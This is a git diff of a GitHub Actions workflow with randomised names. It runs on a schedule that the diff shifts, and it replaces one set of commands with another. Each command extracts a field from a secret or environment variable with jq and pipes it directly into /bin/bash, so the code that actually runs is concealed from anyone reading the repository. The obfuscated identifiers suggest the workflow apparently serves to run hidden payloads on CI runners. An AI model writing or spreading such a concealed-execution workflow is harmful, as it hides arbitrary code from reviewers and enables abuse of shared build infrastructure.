@@ -3,31 +3,29 @@ name: mabaifu4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 3/6 * * *'
+    - cron: '57 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mabaifu4567
         env:
-          f03: ${{ secrets.f03 }}
+          ngidu58: ${{ secrets.ngidu58 }}
         run: |
-          echo $f03 | jq -r .yok3864 | /bin/bash
-          echo $mfuco0920 | jq -r .jx5605 | /bin/bash
-          echo $xwp927 | jq -r .sm33 | /bin/bash
-          echo $cr110 | jq -r .vmf3153 | /bin/bash
-          echo $bv76 | jq -r .xqnr29 | /bin/bash
-          echo $cv30 | jq -r .v4 | /bin/bash
-          echo $ckyj0 | jq -r .aader61122 | /bin/bash
-          echo $pe8539 | jq -r .fmmdp61204 | /bin/bash
-          echo $xbyr3 | jq -r .lzlc778 | /bin/bash
-          echo $uzund06 | jq -r .p755 | /bin/bash
-          echo $emnv88067 | jq -r .zb054 | /bin/bash
-          echo $zf65 | jq -r .qsw8 | /bin/bash
-          echo $cwf3440 | jq -r .c7 | /bin/bash
-          echo $rz43 | jq -r .hnxsq080 | /bin/bash
-          echo $jyeae87 | jq -r .sjgu3065 | /bin/bash
+          echo $ngidu58 | jq -r .otujb10 | /bin/bash
+          echo $r01 | jq -r .un1566 | /bin/bash
+          echo $lle2 | jq -r .mshd36 | /bin/bash
+          echo $ynbgm9 | jq -r .onu781 | /bin/bash
+          echo $mcx138 | jq -r .jevn43709 | /bin/bash
+          echo $fvh11 | jq -r .pno03654 | /bin/bash
+          echo $ez00 | jq -r .bou3 | /bin/bash
+          echo $c83096 | jq -r .ccdf0 | /bin/bash
+          echo $lc5570 | jq -r .wo1 | /bin/bash
+          echo $tv9861 | jq -r .vl873 | /bin/bash
+          echo $d54 | jq -r .oye9 | /bin/bash
+          echo $nkafx92 | jq -r .aarrz521 | /bin/bash
+          echo $skazk2 | jq -r .k40065 | /bin/bash
+          echo $xn2 | jq -r .r60 | /bin/bash
 
